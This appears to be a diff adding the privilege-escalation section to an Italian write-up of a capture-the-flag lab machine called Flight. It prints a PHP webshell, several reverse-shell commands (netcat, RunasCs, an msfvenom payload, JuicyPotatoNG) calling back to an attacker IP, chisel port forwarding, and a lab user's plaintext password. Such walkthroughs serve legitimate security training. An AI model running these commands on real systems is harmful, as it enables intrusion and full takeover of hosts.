@@ -476,5 +476,131 @@ Nella directory "..\Users\C.Bum\Desktop\" trovo il primo flag:
 </p>
 
 ## Privilege Escalation
+Per elevare i miei privilegi controllo il contenuto dello share "Web":
 
-...
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-16.png"/>
+</p>
+
+Avendo i permessi in scrittura provo a caricare un semplice file php (shell.php) per eseguire un comando sulla webshell. In paricolare il file è il seguente:
+
+```text
+<?php
+echo system($_GET['c']);
+?>
+```
+
+**Funziona!**
+
+Ora devo passare da una webshell ad una shell vera. Per farlo scarico l'eseguibile _nc64.exe_ da [qui](https://github.com/int0x33/nc.exe/). Lo carico nella cartella /"flight.htb" (la stessa del file _shell.php_) della macchina vittima, avvio un listener sulla porta 1234 e lancio il seguente comando dalla mia macchina:
+
+```bash
+curl -G flight.htb/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.8 1234'
+```
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-17.png"/>
+</p>
+
+Purtroppo, l'utente della shell appena ottenuta è quella dell'utente _svc_apache_.
+
+Provo quindi ad utilizzare il tool [RunasCs](https://github.com/antonioCoco/RunasCs) per ottenere una shell per l'utente _c.bum_. Copio il file _RunasCs.cs_ nella cartella "flight.htb" e lo compilo:
+
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
+```
+
+Successivamente, lo eseguo per ottenere una reverse-shell per l'utente _c.bum_:
+
+```bash
+.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.8:9999 cmd
+```
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-18.png"/>
+</p>
+
+Provo a trasferire sulla macchina l'eseguibile _winPEAS.exe_ e lo eseguo.
+
+Così facendo scopro che:
+  - L'utente _c.bum_ fa parte di un gruppo WebDevs.
+  - C'è un server IIS nella directory "C:\inetpub".
+  - La porta 8000 è in ascolto.
+
+Quindi procedo utilizzando la tecnica del _Port Forwarding_ tramite il tool [chisel](https://github.com/jpillora/chisel). Per prima cosa carico il file [chisel_1.9.1_windows_amd64](https://github.com/jpillora/chisel/releases) all'interno della cartella "flight.htb". Poi avvio un server sulla mia macchina:
+
+```bash
+chisel server --reverse -p 8001
+```
+
+E successivamente, avvio il client sulla macchina vittima:
+
+```bash
+.\chisel_1.9.1_windows_amd64 client 10.10.14.8:8001 R:8000:127.0.0.1:8000
+```
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-20.png"/>
+</p>
+
+Sulla mia macchina, visito la pagina http://127.0.0.1:8000:
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-19.png"/>
+</p>
+
+Ispezionando i file all'interno della cartella "C:\inetpub" sembra proprio che ci sia una sotto-cartella "development" che è collegata al sito appena visualizzato.
+
+Proverò quindi a sfruttare il fatto che l'utente _c.bum_ può modificare i file all'interno di questa cartella. In particolare, scarico il file [aspx_shell.aspx](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) e lo carico nella cartella "C:\inetpub\development":
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-21.png"/>
+</p>
+
+Visito quindi la pagina http://127.0.0.1:8000/aspx_shell.aspx
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-22.png"/>
+</p>
+
+Provo a digitare un comando:
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-23.png"/>
+</p>
+
+Ora, tramite il tool _mfsvenom_ genero un payload per ottenere una reverse-shell:
+
+```bash
+msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.8 LPORT=6666 > reverse-shell-x64.exe
+```
+
+Lo carico nella cartella "C:\inetpub\development", avvio un listener sulla porta 6666 e lo eseguo tramite la web-shell.
+
+Quindi, dopo 8 ore e 6 schermate aperte, ottengo una shell per l'utente _iis apppool_:
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-24.png"/>
+</p>
+
+Il fatto di non essere ancora root mi distrugge, ma vado avanti lo stesso.
+
+Controllo i privilegi dell'utente:
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-25.png"/>
+</p>
+
+Tra questi c'è _SeImpersonatePrivilege_ il quale è associato ad una famiglia di exploit chiamata _potatoes_.
+
+Quindi scarico il file [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/releases), lo trasferisco sulla macchina vittima e lo eseguo (avviando in precedenza un listener sulla porta 5555):
+
+```bash
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Windows\Temp\nc.exe 10.10.14.8 5555 -e cmd.exe"
+```
+
+<p align="center">
+  <img src="/Immagini/Windows-Box/Flight/flight-26.png"/>
+</p>
+
+Ottengo il secondo flag e vado a dormire.
